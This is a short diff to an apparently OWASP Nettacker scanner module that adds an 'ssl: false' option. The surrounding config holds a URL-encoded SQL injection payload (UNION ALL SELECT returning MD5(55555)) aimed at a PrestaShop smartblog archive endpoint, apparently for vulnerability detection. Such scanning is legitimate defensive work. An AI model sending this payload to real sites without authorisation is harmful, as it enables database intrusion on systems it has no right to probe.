@@ -24,6 +24,7 @@ payloads:
         headers:
           User-Agent: "{user_agent}"
         allow_redirects: false
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-"
